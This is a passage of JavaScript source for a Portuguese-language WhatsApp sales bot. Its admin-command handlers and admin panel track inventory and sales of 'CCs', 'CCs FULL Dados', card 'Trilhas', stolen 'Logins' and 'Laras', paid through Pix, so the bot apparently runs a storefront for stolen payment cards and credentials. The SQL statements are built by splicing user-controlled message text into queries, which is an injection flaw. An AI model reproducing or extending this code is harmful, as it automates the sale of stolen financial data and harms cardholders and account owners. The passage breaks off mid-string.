        //#▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ 
        if (Mensagem_Texto.indexOf("/clientesmodo===") > -1 && Adms.includes(Numero)) {
            Array_Total_Igual = Mensagem_Texto.match(/\=/igm);
            msg = Mensagem_Texto.split("===")

            if (msg[1] === "" || Array_Total_Igual.length != 3) {
                Texto = `Comando inválido`
                await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
            }

            if (msg[1] === "0") {
                Texto = `*QUANDO CLIENTE INTERAGIR, O BOT VAI PERGUNTAR QUAL MODO DESEJA!*`
                await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                await DataBase_Better.prepare(`UPDATE SISTEMA SET VALOR = '0' WHERE PARAMETRO = 'TIPOMENU_ORDEM'`).run()
                await DataBase_Better.prepare(`UPDATE CONTATOS SET TIPOMENU_ATUAL = '0'`).run()
                Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
            } else if (msg[1] === "a") {
                Texto = `*TODOS NO MODO AVANÇADO*`
                await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                await DataBase_Better.prepare(`UPDATE SISTEMA SET VALOR = 'a' WHERE PARAMETRO = 'TIPOMENU_ORDEM'`).run()
                await DataBase_Better.prepare(`UPDATE CONTATOS SET TIPOMENU_ATUAL = 'a'`).run()
                Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
            } else if (msg[1] === "s") {
                Texto = `*TODOS NO MODO SIMPLES*`
                await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                await DataBase_Better.prepare(`UPDATE SISTEMA SET VALOR = 's' WHERE PARAMETRO = 'TIPOMENU_ORDEM'`).run()
                await DataBase_Better.prepare(`UPDATE CONTATOS SET TIPOMENU_ATUAL = 's'`).run()
                Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
            } else {
                Texto = `*ERRO: Opções = 0/a/s*`
                await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
            }
        }
        //#-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳

        //console.log('\x1b[33m%s\x1b[0m', LinhaAtual())
        //#▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ 
        if (Mensagem_Texto.indexOf("/modo===") > -1) {
            Array_Total_Igual = Mensagem_Texto.match(/\=/igm);
            msg = Mensagem_Texto.split("===")

            if (msg[1] === "" || Array_Total_Igual.length != 3) {
                Texto = `Comando inválido`
                await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
            }

            if (msg[1] === "a") {
                Texto = `*INTERAÇÃO ALTERNADA PARA: MODO AVANÇADO* 💠

*Recursos:* Mensagens com botões, Menus, Listas, Catálogos e etc...

Envie qualquer menssagem no Bot para interagir!`
                await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                await DataBase_Better.prepare(`UPDATE CONTATOS SET TIPOMENU_ATUAL = 'a' WHERE ID_CONTATO = '${Mensagem_From}'`).run()
                Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
            } else if (msg[1] === "s") {
                Texto = `*INTERAÇÃO ALTERNADA PARA: MODO SIMPLES* 🌀

*Recursos:* Interação via comandos, Bot responderá apenas com textos simples.

Envie qualquer menssagem no Bot para interagir!`
                await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                await DataBase_Better.prepare(`UPDATE CONTATOS SET TIPOMENU_ATUAL = 's' WHERE ID_CONTATO = '${Mensagem_From}'`).run()
                Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
            } else {
                Texto = `*VOCÊ DIGITOU ALGO ERRADO... DIGITE /modo===a OU /modo===s*`
                await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
            }
        }
        //#-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳

        //console.log('\x1b[33m%s\x1b[0m', LinhaAtual())



        if (Mensagem_Texto.indexOf("/admelfo") > -1 && Adms.includes(Numero)) {
            Texto = `🧝🏼‍♂️ *SUPER PACK ELFO COMANDOS* 🧝🏼‍♂️

◎ ══════ ❈ ══════ ◎
*ABASTECER SUPER PACOTE ELFO*
◎ ══════ ❈ ══════ ◎

*EXEMPLO DO COMANDO*
/addpackelfo===TEXTO CONTENDO MATERIAL
┕━━━━╗✹╔━━━━┙



◎ ══════ ❈ ══════ ◎
*DEFINIR TEXTO MENU SUPER PACK ELFO*
◎ ══════ ❈ ══════ ◎

*EXEMPLO DO COMANDO*
/textomenuelfo===BEM VINDO CAMBADA
┕━━━━╗✹╔━━━━┙



◎ ══════ ❈ ══════ ◎
*DEFINIR TEXTO PÓS COMPRA SUPER PACK ELFO*
◎ ══════ ❈ ══════ ◎

*EXEMPLO DO COMANDO*
/textocomprouelfo===OBRIGADO PELA COMPRA
┕━━━━╗✹╔━━━━┙
`
            await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
            Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
        }



        //#▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ 
        if (Mensagem_Texto.toString() === "/adm" && Adms.includes(Numero)) {

            Status_Tamanho_Pasta_Token = ""
            if (parseFloat(Tamanho_Token) < 1000) {
                Status_Tamanho_Pasta_Token = `✅ *NECESSIDADE DE REFAZER QRCODE: BAIXA*`
            } else if (parseFloat(Tamanho_Token) < 2000) {
                Status_Tamanho_Pasta_Token = `⭕ *NECESSIDADE DE REFAZER QRCODE: MÉDIA*`
            } else {
                Status_Tamanho_Pasta_Token = `⚠️⚠️⚠️⚠️⚠️⚠️⚠️
*NECESSIDADE DE REFAZER QRCODE: ALTA*
⚠️⚠️⚠️⚠️⚠️⚠️⚠️`
            }

            BOT_CC = await DataBase_Better.prepare(`SELECT VALOR FROM SISTEMA WHERE PARAMETRO = 'BOT_CC'`).get()["VALOR"]
            if (BOT_CC === "1") { BOT_CC_Descricao_Lista = "✅ Comandos de ajustes sobre as CCs." } else { BOT_CC_Descricao_Lista = "❌ PAGUE PARA LIBERAR!" }
            BOT_CONSULTADA = await DataBase_Better.prepare(`SELECT VALOR FROM SISTEMA WHERE PARAMETRO = 'BOT_CONSULTADA'`).get()["VALOR"]
            if (BOT_CONSULTADA === "1") { BOT_CONSULTADA_Descricao_Lista = "✅ Comandos de ajustes sobre as CCs." } else { BOT_CONSULTADA_Descricao_Lista = "❌ PAGUE PARA LIBERAR!" }
            BOT_CONSUL = await DataBase_Better.prepare(`SELECT VALOR FROM SISTEMA WHERE PARAMETRO = 'BOT_CONSUL'`).get()["VALOR"]
            if (BOT_CONSUL === "1") { BOT_CONSUL_Descricao_Lista = "✅ Comandos de ajustes sobre as Consultáveis" } else { BOT_CONSUL_Descricao_Lista = "❌ PAGUE PARA LIBERAR!" }
            BOT_TRILHAS = await DataBase_Better.prepare(`SELECT VALOR FROM SISTEMA WHERE PARAMETRO = 'BOT_TRILHAS'`).get()["VALOR"]
            if (BOT_TRILHAS === "1") { BOT_TRILHAS_Descricao_Lista = "✅ Comandos de ajustes sobre as Trilhas" } else { BOT_TRILHAS_Descricao_Lista = "❌ PAGUE PARA LIBERAR!" }
            BOT_LOGIN = await DataBase_Better.prepare(`SELECT VALOR FROM SISTEMA WHERE PARAMETRO = 'BOT_LOGIN'`).get()["VALOR"]
            if (BOT_LOGIN === "1") { BOT_LOGIN_Descricao_Lista = "✅ Comandos de ajustes sobre os Logins." } else { BOT_LOGIN_Descricao_Lista = "❌ PAGUE PARA LIBERAR!" }
            BOT_LARA = await DataBase_Better.prepare(`SELECT VALOR FROM SISTEMA WHERE PARAMETRO = 'BOT_LARA'`).get()["VALOR"]
            if (BOT_LARA === "1") { BOT_LARA_Descricao_Lista = "✅ Comandos de ajustes sobre as Laras." } else { BOT_LARA_Descricao_Lista = "❌ PAGUE PARA LIBERAR!" }

            TEXTO_SUPORTE = await DataBase_Better.prepare(`SELECT VALOR FROM SISTEMA WHERE PARAMETRO = 'TEXTO_SUPORTE'`).get()["VALOR"]

            VALOR_SEMANA = await DataBase_Better.prepare(`SELECT VALOR FROM SISTEMA WHERE PARAMETRO = 'VALOR_SEMANA'`).get()["VALOR"]
            VALOR_SEMANA = parseFloat(VALOR_SEMANA).toFixed(2)

            FUNCAO_ASSOCIADOS_PAGO = await DataBase_Better.prepare(`SELECT VALOR FROM SISTEMA WHERE PARAMETRO = 'FUNCAO_ASSOCIADOS_PAGO'`).get()["VALOR"]
            if (FUNCAO_ASSOCIADOS_PAGO === "1") { FUNCAO_ASSOCIADOS_PAGO_Descricao_Lista = "🟢 Tenha clientes trabalhando para você! Ao indicar pessoas eles ganham algo." } else { FUNCAO_ASSOCIADOS_PAGO_Descricao_Lista = "🔴 PAGUE PARA LIBERAR!" }

            DATA_VENCIMENTO_MS = await DataBase_Better.prepare(`SELECT VALOR FROM SISTEMA WHERE PARAMETRO = 'DATA_VENCIMENTO_MS'`).get()["VALOR"]
            DIAS_VENCIMENTO_MS_VISUAL = new Date(parseInt(DATA_VENCIMENTO_MS)).toLocaleString()

            DATA_ATIVACAO_MS = await DataBase_Better.prepare(`SELECT DATA_MS_INSERIDO FROM CONTATOS LIMIT 1`).get()["DATA_MS_INSERIDO"]
            DATA_ATIVACAO_VISUAL = new Date(parseInt(DATA_ATIVACAO_MS)).toLocaleString()

            Data_Dia = new Date(new Date(startOf("day", new Date())).getTime()).toLocaleString()
            Data_Dia_MS = new Date(startOf("day", new Date())).getTime()
            Data_Semana = new Date(new Date(startOf("week", new Date())).getTime()).toLocaleString()
            Data_Semana_MS = new Date(startOf("week", new Date())).getTime()
            Data_Mes = new Date(new Date(startOf("month", new Date())).getTime()).toLocaleString()
            Data_Mes_MS = new Date(startOf("month", new Date())).getTime()

            TUSER = await DataBase_Better.prepare(`SELECT COUNT(*) FROM CONTATOS`).get()["COUNT(*)"]

            PIXINSERIDOS = await DataBase_Better.prepare(`SELECT SUM(CAST(VALOR as FLOAT)) FROM PIX_COPIA_COLA WHERE PROCESSADO = 1`).get()["SUM(CAST(VALOR as FLOAT))"]
            PIXINSERIDOS = parseFloat(PIXINSERIDOS).toFixed(2);
            if (PIXINSERIDOS === "NaN" || PIXINSERIDOS === null) { PIXINSERIDOS = "0" }

            MAIORPIX = await DataBase_Better.prepare(`SELECT MAX(CAST(VALOR as FLOAT)) FROM PIX_COPIA_COLA WHERE PROCESSADO = 1`).get()["MAX(CAST(VALOR as FLOAT))"]
            if (MAIORPIX === "NaN" || MAIORPIX === null) { MAIORPIX = "0" }

            PIXINSERIDOS_DIA = await DataBase_Better.prepare(`SELECT SUM(CAST(VALOR as FLOAT)) FROM PIX_COPIA_COLA WHERE PROCESSADO = 1 AND DATA_INSERIDO_MS > ${Data_Dia_MS}`).get()["SUM(CAST(VALOR as FLOAT))"]
            PIXINSERIDOS_DIA = parseFloat(PIXINSERIDOS_DIA).toFixed(2)
            if (PIXINSERIDOS_DIA === "NaN" || PIXINSERIDOS_DIA === null) { PIXINSERIDOS_DIA = "0" }
            PIXINSERIDOS_SEMANA = await DataBase_Better.prepare(`SELECT SUM(CAST(VALOR as FLOAT)) FROM PIX_COPIA_COLA WHERE PROCESSADO = 1 AND DATA_INSERIDO_MS > ${Data_Semana_MS}`).get()["SUM(CAST(VALOR as FLOAT))"]
            PIXINSERIDOS_SEMANA = parseFloat(PIXINSERIDOS_SEMANA).toFixed(2)
            if (PIXINSERIDOS_SEMANA === "NaN" || PIXINSERIDOS_SEMANA === null) { PIXINSERIDOS_SEMANA = "0" }
            PIXINSERIDOS_MES = await DataBase_Better.prepare(`SELECT SUM(CAST(VALOR as FLOAT)) FROM PIX_COPIA_COLA WHERE PROCESSADO = 1 AND DATA_INSERIDO_MS > ${parseInt(Data_Mes_MS)}`).get()["SUM(CAST(VALOR as FLOAT))"]
            PIXINSERIDOS_MES = parseFloat(PIXINSERIDOS_MES).toFixed(2)
            if (PIXINSERIDOS_MES === "NaN" || PIXINSERIDOS_MES === null) { PIXINSERIDOS_MES = "0" }

            GIFTS_RESGATADOS = await DataBase_Better.prepare(`SELECT SUM(CAST(VALOR as FLOAT)) FROM GIFTS WHERE USADO = 1`).get()["SUM(CAST(VALOR as FLOAT))"]
            GIFTS_RESGATADOS = parseFloat(GIFTS_RESGATADOS).toFixed(2)
            if (GIFTS_RESGATADOS === "NaN" || GIFTS_RESGATADOS === null) { GIFTS_RESGATADOS = "0" }
            MAIORGIFT = await DataBase_Better.prepare(`SELECT MAX(CAST(VALOR as FLOAT)) FROM GIFTS WHERE USADO = 1`).get()["MAX(CAST(VALOR as FLOAT))"]
            MAIORGIFT = parseFloat(MAIORGIFT).toFixed(2)
            if (MAIORGIFT === "NaN" || MAIORGIFT === null) { MAIORGIFT = "0" }

            //#▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀

            TCC_NORMAL = await DataBase_Better.prepare(`SELECT COUNT(*) FROM CCS WHERE TIPOCC = '1'`).get()["COUNT(*)"]
            TCC_FULL = await DataBase_Better.prepare(`SELECT COUNT(*) FROM CCS WHERE TIPOCC = '2'`).get()["COUNT(*)"]

            TCCVENDIDAS = await DataBase_Better.prepare(`SELECT COUNT(*) FROM CCS_VENDIDAS`).get()["COUNT(*)"]
            if (TCCVENDIDAS === "NaN" || TCCVENDIDAS === null) { TCCVENDIDAS = "0" }

            PACOTES_VENDIDOS_CCS = await DataBase_Better.prepare(`SELECT SUM(QUANTIDADE) FROM PACOTES_CC_VENDIDOSV3`).get()["SUM(QUANTIDADE)"]
            if (PACOTES_VENDIDOS_CCS === "NaN" || PACOTES_VENDIDOS_CCS === null) { PACOTES_VENDIDOS_CCS = "0" }
            PACOTES_TOTAL_ROWS = await DataBase_Better.prepare(`SELECT COUNT(*) FROM PACOTES_CC_VENDIDOSV3`).get()["COUNT(*)"]
            if (PACOTES_TOTAL_ROWS === "NaN" || PACOTES_TOTAL_ROWS === null) { PACOTES_TOTAL_ROWS = "0" }

            SOMA_TOTAL_CCS_VENDIDAS = parseInt(TCCVENDIDAS) + parseInt(PACOTES_TOTAL_ROWS)
            if (SOMA_TOTAL_CCS_VENDIDAS === "NaN" || SOMA_TOTAL_CCS_VENDIDAS === null) { SOMA_TOTAL_CCS_VENDIDAS = "0" }

            //#▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀

            TCONSUL = await DataBase_Better.prepare(`SELECT COUNT(*) FROM CONSULTAVEIS`).get()["COUNT(*)"]
            TCONSULVENDIDAS = await DataBase_Better.prepare(`SELECT COUNT(*) FROM CONSULTAVEIS_VENDIDAS`).get()["COUNT(*)"]

            //#▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀

            TCONSULTADA = await DataBase_Better.prepare(`SELECT COUNT(*) FROM CONSULTADAS`).get()["COUNT(*)"]
            TCONSULTADASVENDIDAS = await DataBase_Better.prepare(`SELECT COUNT(*) FROM CONSULTADAS_VENDIDAS`).get()["COUNT(*)"]

            //#▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀

            TTRILHAS = await DataBase_Better.prepare(`SELECT COUNT(*) FROM TRILHAS`).get()["COUNT(*)"]
            TTRILHASVENDIDAS = await DataBase_Better.prepare(`SELECT COUNT(*) FROM TRILHAS_VENDIDAS`).get()["COUNT(*)"]

            //#▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀

            TLOGINS = await DataBase_Better.prepare(`SELECT COUNT(*) FROM LOGINS`).get()["COUNT(*)"]
            TLOGINSVENDIDOS = await DataBase_Better.prepare(`SELECT COUNT(*) FROM LOGINS_VENDIDOS`).get()["COUNT(*)"]

            //#▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀

            TLARAS = await DataBase_Better.prepare(`SELECT COUNT(*) FROM LARAS`).get()["COUNT(*)"]
            TLARASVENDIDAS = await DataBase_Better.prepare(`SELECT COUNT(*) FROM LARAS_VENDIDAS`).get()["COUNT(*)"]

            //#▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀

            Texto_Adicional = ""
            if (BOT_CC === "1") {
                Texto_Adicional = `${Texto_Adicional}
────────────────
*${TCC_NORMAL}* Info CCs no estoque.
*${TCC_FULL}* CCs FULL Dados no estoque.
────────────────

*${TCCVENDIDAS}* CCs unitárias vendidas.
*${PACOTES_TOTAL_ROWS}* Pacotes vendidos.
*${PACOTES_VENDIDOS_CCS}* CCs vendidas nesses pacotes.
*${SOMA_TOTAL_CCS_VENDIDAS}* CCs vendidas no total.

◢▬▬▬▬▬▬▬▛▚▟▬▬▬▬▬▬◣
`
            }
            if (BOT_CONSUL === "1") {
                Texto_Adicional = `${Texto_Adicional}
────────────────
*${TCONSUL}* Consultáveis no estoque.
────────────────

*${TCONSULVENDIDAS}* Consultáveis vendidas.

◢▬▬▬▬▬▬▬▛▚▟▬▬▬▬▬▬◣
`
            }
            if (BOT_CONSULTADA === "1") {
                Texto_Adicional = `${Texto_Adicional}
────────────────
*${TCONSULTADA}* Consultadas no estoque.
────────────────

*${TCONSULTADASVENDIDAS}* Consultadas vendidas.

◢▬▬▬▬▬▬▬▛▚▟▬▬▬▬▬▬◣
`
            }
            if (BOT_TRILHAS === "1") {
                Texto_Adicional = `${Texto_Adicional}
────────────────
*${TTRILHAS}* Trilhas no estoque.
────────────────

*${TTRILHASVENDIDAS}* Trilhas vendidas.

◢▬▬▬▬▬▬▬▛▚▟▬▬▬▬▬▬◣
`
            }
            if (BOT_LOGIN === "1") {
                Texto_Adicional = `${Texto_Adicional}
────────────────
*${TLOGINS}* Logins no estoque.
────────────────

*${TLOGINSVENDIDOS}* Logins vendidos.

◢▬▬▬▬▬▬▬▛▚▟▬▬▬▬▬▬◣
`
            }
            if (BOT_LARA === "1") {
                Texto_Adicional = `${Texto_Adicional}
────────────────
*${TLARAS}* Laras no estoque.
────────────────

*${TLARASVENDIDAS}* Laras vendidas.

◢▬▬▬▬▬▬▬▛▚▟▬▬▬▬▬▬◣
`
            }


            Titulo = 'Painel administrativo'
            iD_Footer = Date.now()
            Texto_ADM = `*PAINEL ADM*

❦ ════ •⊰❂⊱• ════ ❦
*DATA QUE O BOT FOI ATIVADO:*
${DATA_ATIVACAO_VISUAL}
❦ ════ •⊰❂⊱• ════ ❦

${Status_Tamanho_Pasta_Token}

◢▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬◣
*BOT:* ${Nome_Bot}
*COD:* ${VERSAO}

*DONO OFICIAL DO BOT*
${Nome_Dono} - wa.me/${Numero_Dono}

*ADMS DO BOT*
${Adms}

*SUPORTE DO BOT*
